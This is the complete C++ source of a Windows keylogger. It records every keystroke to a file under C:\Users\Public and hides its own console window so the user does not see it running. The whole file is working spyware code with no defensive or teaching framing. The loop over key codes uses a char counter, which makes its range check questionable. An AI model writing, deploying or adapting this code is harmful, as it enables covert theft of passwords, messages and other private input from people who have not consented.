#include <iostream>
#include <Windows.h>
#include <WinUser.h>

using namespace std;

void keys() {
    char c;
    HANDLE hFile;
    DWORD numberofbytes;
    LPCSTR file = "C:\\Users\\Public\\keylogger.txt";

    hFile = CreateFileA(file, FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        cerr << "[-] Error in File Creating";
        return;
    }

    bool keyStates[256] = { false };

    while (true) {
        for (c = 8; c <= 255; c++) {
            SHORT keyState = GetAsyncKeyState(c);
            bool isKeyPressed = (keyState & 0x8000) != 0;
            if (isKeyPressed && !keyStates[(unsigned char)c]) {
                keyStates[(unsigned char)c] = true;

                // Determine if the Shift key is pressed
                bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

                // Translate virtual key code to character
                BYTE keyboardState[256];
                GetKeyboardState(keyboardState);
                if (isShiftPressed) {
                    keyboardState[VK_SHIFT] = 0x80;
                }
                else {
                    keyboardState[VK_SHIFT] = 0;
                }

                // Convert the virtual key code to a character
                WCHAR buffer[2] = { 0 };
                int result = ToUnicode(c, 0, keyboardState, buffer, 2, 0);
                char output;

                if (result > 0) {
                    output = static_cast<char>(buffer[0]);
                }
                else {
                    switch (c) {
                    case VK_RETURN:
                        output = '\n'; // Newline for Enter key
                        break;
                    case VK_BACK:
                        output = '\b'; // Backspace
                        break;
                    case VK_TAB:
                        output = '\t'; // Tab
                        break;
                    default:
                        output = '\0'; // Null character for unhandled keys
                    }
                }

                if (output != '\0') {
                    DWORD written;
                    WriteFile(hFile, &output, 1, &written, NULL);
                }
            }
            else if (!isKeyPressed) {
                keyStates[(unsigned char)c] = false;
            }
        }
        Sleep(10);  // To prevent high CPU usage
    }

    CloseHandle(hFile);
}

int main(int argc, char* argv[]) {
    FreeConsole();
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    keys();
    return 0;
}
